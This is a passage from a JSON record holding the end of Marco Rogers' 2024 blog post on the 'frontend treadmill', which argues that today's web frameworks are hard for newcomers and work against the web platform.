creative and enthusiastic about building cool things. They just can’t. They are trying and failing because the tools being recommended to them are just not approachable enough. And at the same time, they’re being convinced that learning fundamentals is a waste of time because it’s so different from what everybody is talking about.I guess I want to close by stating my biases. I’m a web guy. I’ve been bullish on the web for 20+ years, and I will continue to be. I think it is an extremely capable and unique platform for delivering software. And it has only gotten better over time while retaining an incredible level of backwards compatibility. The underlying tools we have are dope now. But our current framework layer is working against the grain instead of embracing the platform.This is from a recent thread I wrote on mastodon. Reproduced with only light editing.2024-06-18https://polotek.net/posts/the-frontend-treadmill/\nMarco Rogers (polotek)",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  }
]